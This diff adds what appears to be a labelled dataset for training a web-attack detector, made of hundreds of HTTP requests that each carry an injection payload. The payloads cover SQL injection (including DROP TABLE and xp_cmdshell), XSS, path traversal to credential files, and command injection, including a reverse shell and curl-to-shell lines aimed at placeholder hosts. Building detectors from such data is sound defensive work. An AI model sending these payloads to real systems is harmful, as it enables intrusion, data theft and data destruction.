@@ -1,0 +1,599 @@
+{"text": "GET /system?cmd=; BODY:wget http://evil.com/backdoor", "label": "attack"}
+{"text": "GET /file?q=<svg BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR 1=1#", "label": "attack"}
+{"text": "GET /download?q=<input BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?q=javascript:alert('XSS')", "label": "attack"}
+{"text": "GET /system?cmd=; BODY:cat /etc/passwd", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}", "label": "attack"}
+{"text": "GET /login?q=<select BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /file?q=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}", "label": "attack"}
+{"text": "GET /file?name=....\\....\\....\\etc\\passwd", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}", "label": "attack"}
+{"text": "GET /file?q=<audio BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /search?id=' BODY:AND 1=1--", "label": "attack"}
+{"text": "GET /api/data?id='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "GET /search?q=<audio BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /login?id=admin'--", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}", "label": "attack"}
+{"text": "GET /login?q=<video><source BODY:onerror=alert(1)>", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}", "label": "attack"}
+{"text": "GET /file?q=<details BODY:open ontoggle=alert(1)>", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"admin'--\"}", "label": "attack"}
+{"text": "GET /download?id=1'; BODY:DELETE FROM users;--", "label": "attack"}
+{"text": "GET /upload?id=1'; BODY:DELETE FROM users;--", "label": "attack"}
+{"text": "GET /admin?q=<script>alert('XSS')</script>", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /admin?q=<input BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /upload?id='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}", "label": "attack"}
+{"text": "GET /download?q=<svg BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /download?q=<select BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}", "label": "attack"}
+{"text": "GET /upload?q=<svg BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /file?q=javascript:alert('XSS')", "label": "attack"}
+{"text": "GET /download?q=<textarea BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /file?q=<input BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR 'x'='x", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}", "label": "attack"}
+{"text": "GET /search?q=<keygen BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /file?id=' BODY:AND 1=1--", "label": "attack"}
+{"text": "GET /file?name=....//....//etc/passwd%00.jpg", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}", "label": "attack"}
+{"text": "GET /file?id='; BODY:EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /upload?id='; BODY:EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /upload?id=admin' BODY:OR '1'='1'#", "label": "attack"}
+{"text": "GET /admin?q=javascript:alert('XSS')", "label": "attack"}
+{"text": "GET /admin?id=' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}", "label": "attack"}
+{"text": "GET /file?id=1'; BODY:DELETE FROM users;--", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /login?q=<textarea BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"admin'--\"}", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR '1'='1", "label": "attack"}
+{"text": "GET /search?q=<video><source BODY:onerror=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?q=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /file?name=..%2f..%2f..%2fetc%2fpasswd", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR '1'='1", "label": "attack"}
+{"text": "GET /admin?q=<details BODY:open ontoggle=alert(1)>", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}", "label": "attack"}
+{"text": "GET /download?id=' BODY:AND 1=1--", "label": "attack"}
+{"text": "GET /api/data?q=<iframe BODY:src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /upload?q=<video><source BODY:onerror=alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd=; BODY:nc -e /bin/sh attacker.com 4444", "label": "attack"}
+{"text": "GET /download?q=<body BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<audio BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}", "label": "attack"}
+{"text": "GET /api/data?q=<keygen BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /api/data?q=<video><source BODY:onerror=alert(1)>", "label": "attack"}
+{"text": "GET /file?name=....//....//....//etc/passwd", "label": "attack"}
+{"text": "GET /search?q=<details BODY:open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR 1=1--", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /search?q=javascript:alert('XSS')", "label": "attack"}
+{"text": "GET /file?q=<video><source BODY:onerror=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}", "label": "attack"}
+{"text": "GET /api/data?id='; BODY:EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR 1=1#", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR '1'='1", "label": "attack"}
+{"text": "GET /login?q=<marquee BODY:onstart=alert(1)>", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1--\"}", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' AND 1=1--\"}", "label": "attack"}
+{"text": "GET /upload?q=<keygen BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /download?q=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /login?id='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "GET /file?q=<body BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<svg BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /upload?q=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /file?q=<textarea BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' AND 1=1--\"}", "label": "attack"}
+{"text": "GET /login?q=<details BODY:open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /download?q=<keygen BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /file?name=../../../../../../etc/passwd", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR '1'='1", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR '1'='1", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1#\"}", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}", "label": "attack"}
+{"text": "GET /api/data?q=<details BODY:open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR 1=1--", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}", "label": "attack"}
+{"text": "GET /admin?q=<keygen BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR 'x'='x", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR 'x'='x", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}", "label": "attack"}
+{"text": "GET /download?q=javascript:alert('XSS')", "label": "attack"}
+{"text": "GET /upload?q=javascript:alert('XSS')", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}", "label": "attack"}
+{"text": "GET /admin?q=<select BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "GET /admin?id=admin'--", "label": "attack"}
+{"text": "GET /login?id=admin' BODY:OR '1'='1'#", "label": "attack"}
+{"text": "GET /download?id=admin'--", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /file?id='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' AND 1=1--\"}", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}", "label": "attack"}
+{"text": "GET /upload?id=' BODY:AND 1=1--", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}", "label": "attack"}
+{"text": "GET /upload?id=1' BODY:OR '1'='1' /*", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR 1=1#", "label": "attack"}
+{"text": "GET /upload?q=<script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /search?id=admin' BODY:OR '1'='1'#", "label": "attack"}
+{"text": "GET /api/data?q=<input BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /admin?q=<textarea BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1--\"}", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}", "label": "attack"}
+{"text": "GET /download?q='\"><script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /api/data?q=<audio BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR 1=1#", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /search?q=<svg BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /search?id=1'; BODY:DELETE FROM users;--", "label": "attack"}
+{"text": "GET /admin?id=1'; BODY:DELETE FROM users;--", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1#\"}", "label": "attack"}
+{"text": "GET /upload?id=' BODY:UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}", "label": "attack"}
+{"text": "GET /admin?id=admin' BODY:OR '1'='1'#", "label": "attack"}
+{"text": "GET /system?cmd=| BODY:whoami", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR 'x'='x", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' UNION ALL SELECT NULL--\"}", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /login?q=<script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /api/data?q=<select BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR 'x'='x", "label": "attack"}
+{"text": "GET /admin?id=' BODY:UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1#\"}", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR 1=1--", "label": "attack"}
+{"text": "GET /download?q=<iframe BODY:src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd= BODY:dir", "label": "attack"}
+{"text": "GET /upload?q=<audio BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}", "label": "attack"}
+{"text": "GET /search?q=<body BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /login?id=1'; BODY:DELETE FROM users;--", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR 1=1--", "label": "attack"}
+{"text": "GET /api/data?q=<svg BODY:onload=alert(1)>", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}", "label": "attack"}
+{"text": "GET /search?q=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?q=<textarea BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR pg_sleep(5)--", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}", "label": "attack"}
+{"text": "GET /admin?q=<audio BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}", "label": "attack"}
+{"text": "GET /api/data?q=<body BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /download?id=1' BODY:OR '1'='1' /*", "label": "attack"}
+{"text": "GET /download?q=<details BODY:open ontoggle=alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd=| BODY:curl http://evil.com/shell.sh | sh", "label": "attack"}
+{"text": "GET /login?id=' BODY:OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /upload?q=<textarea BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR 'x'='x", "label": "attack"}
+{"text": "GET /file?q=<select BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR '1'='1", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1--\"}", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR (SELECT COUNT(*) FROM users) > 0--", "label": "attack"}
+{"text": "GET /admin?q=<video><source BODY:onerror=alert(1)>", "label": "attack"}
+{"text": "GET /admin?id='; BODY:EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /file?name=/etc/passwd%00", "label": "attack"}
+{"text": "GET /file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1#\"}", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /file?id=admin'--", "label": "attack"}
+{"text": "GET /file?name=..%252f..%252f..%252fetc%252fpasswd", "label": "attack"}
+{"text": "GET /search?id=' BODY:OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "GET /file?q='\"><script>alert('XSS')</script>", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}", "label": "attack"}
+{"text": "GET /admin?q=<marquee BODY:onstart=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?id=admin' BODY:OR '1'='1'#", "label": "attack"}
+{"text": "GET /system?cmd=${IFS}cat${IFS}/etc/passwd", "label": "attack"}
+{"text": "GET /api/data?id=1' BODY:OR '1'='1' /*", "label": "attack"}
+{"text": "GET /search?id=admin'--", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"admin'--\"}", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /file?q=<keygen BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1--\"}", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1#\"}", "label": "attack"}
+{"text": "GET /search?q=<select BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR pg_sleep(5)--\"}", "label": "attack"}
+{"text": "GET /download?id='; BODY:DROP TABLE users;--", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR 1=1--", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}", "label": "attack"}
+{"text": "GET /admin?q='\"><script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /upload?q=<select BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /system?cmd=|| BODY:cmd /c dir", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' AND 1=1--\"}", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}", "label": "attack"}
+{"text": "GET /login?q=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}", "label": "attack"}
+{"text": "GET /admin?id=' BODY:AND 1=1--", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}", "label": "attack"}
+{"text": "GET /admin?id=1' BODY:OR '1'='1' /*", "label": "attack"}
+{"text": "GET /search?id=1' BODY:OR '1'='1' /*", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}", "label": "attack"}
+{"text": "GET /file?name=../../../etc/passwd", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}", "label": "attack"}
+{"text": "GET /download?id=' BODY:UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR BENCHMARK(1000000,MD5(1))--", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}", "label": "attack"}
+{"text": "GET /admin?id=' BODY:OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /search?q='\"><script>alert('XSS')</script>", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1#\"}", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"admin'--\"}", "label": "attack"}
+{"text": "GET /login?q='\"><script>alert('XSS')</script>", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}", "label": "attack"}
+{"text": "GET /search?id='; BODY:EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /api/data?q=<marquee BODY:onstart=alert(1)>", "label": "attack"}
+{"text": "GET /login?q=<input BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /admin?q=<iframe BODY:src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<textarea BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "GET /download?q=<audio BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}", "label": "attack"}
+{"text": "GET /login?q=<iframe BODY:src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR pg_sleep(5)--", "label": "attack"}
+{"text": "GET /system?cmd=|| BODY:ls -la", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' UNION SELECT * FROM users--\"}", "label": "attack"}
+{"text": "POST /file? BODY:{\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR SLEEP(5)--\"}", "label": "attack"}
+{"text": "GET /download?id='; BODY:EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /search?q=<marquee BODY:onstart=alert(1)>", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}", "label": "attack"}
+{"text": "GET /file?id=1' BODY:OR '1'='1' /*", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR SLEEP(5)--", "label": "attack"}
+{"text": "GET /login?id=' BODY:UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "POST /upload? BODY:{\"username\": \"admin\", \"password\": \"' OR (SELECT COUNT(*) FROM users) > 0--\"}", "label": "attack"}
+{"text": "GET /upload?q=<details BODY:open ontoggle=alert(1)>", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"'; EXEC xp_cmdshell('dir');--\"}", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"'; DROP TABLE users;--\"}", "label": "attack"}
+{"text": "GET /api/data?id=admin'--", "label": "attack"}
+{"text": "GET /download?q=<video><source BODY:onerror=alert(1)>", "label": "attack"}
+{"text": "GET /search?q=<input BODY:onfocus=alert(1) autofocus>", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1--\"}", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR '1'='1", "label": "attack"}
+{"text": "POST /admin? BODY:{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}", "label": "attack"}
+{"text": "GET /file?q=<script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /download?q=<script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /download?id=' BODY:OR 1=1#", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1#\"}", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:OR 'x'='x", "label": "attack"}
+{"text": "GET /file?q=<iframe BODY:src=javascript:alert(1)>", "label": "attack"}
+{"text": "GET /file?name=..\\..\\..\\windows\\system32\\config\\sam", "label": "attack"}
+{"text": "GET /file?id=' BODY:UNION SELECT * FROM users--", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR '1'='1\"}", "label": "attack"}
+{"text": "GET /search?id=' BODY:UNION ALL SELECT NULL--", "label": "attack"}
+{"text": "GET /login?id='; BODY:EXEC xp_cmdshell('dir');--", "label": "attack"}
+{"text": "GET /upload?q='\"><script>alert('XSS')</script>", "label": "attack"}
+{"text": "GET /login?q=javascript:alert('XSS')", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"1' OR '1'='1' /*\"}", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"admin'--\"}", "label": "attack"}
+{"text": "GET /download?q=<marquee BODY:onstart=alert(1)>", "label": "attack"}
+{"text": "GET /api/data?id=' BODY:AND 1=1--", "label": "attack"}
+{"text": "GET /upload?id=admin'--", "label": "attack"}
+{"text": "GET /upload?id=' BODY:OR 1=1--", "label": "attack"}
+{"text": "POST /login? BODY:{\"username\": \"admin\", \"password\": \"' OR 1=1--\"}", "label": "attack"}
+{"text": "GET /file?id=' BODY:OR 1=1--", "label": "attack"}
+{"text": "GET /admin?q=<img BODY:src=x onerror=alert(1)>", "label": "attack"}
+{"text": "GET /admin?q=<body BODY:onload=alert(1)>", "label": "attack"}
+{"text": "GET /system?cmd= BODY:powershell -c Get-Process", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"' OR 'x'='x\"}", "label": "attack"}
+{"text": "GET /search?q=<iframe BODY:src=javascript:alert(1)>", "label": "attack"}
+{"text": "POST /api/data? BODY:{\"username\": \"admin\", \"password\": \"' OR BENCHMARK(1000000,MD5(1))--\"}", "label": "attack"}
+{"text": "GET /upload?q=<marquee BODY:onstart=alert(1)>", "label": "attack"}
+{"text": "GET /file?name=..\\..\\..\\..\\..\\..\\etc\\passwd", "label": "attack"}
+{"text": "GET /file?id=admin' BODY:OR '1'='1'#", "label": "attack"}
+{"text": "POST /search? BODY:{\"username\": \"admin\", \"password\": \"1'; DELETE FROM users;--\"}", "label": "attack"}
+{"text": "POST /download? BODY:{\"username\": \"admin\", \"password\": \"admin' OR '1'='1'#\"}", "label": "attack"}
+{"text": "GET /system?cmd=$(whoami)", "label": "attack"}
+{"text": "GET /login?id=' BODY:AND 1=1--", "label": "attack"}
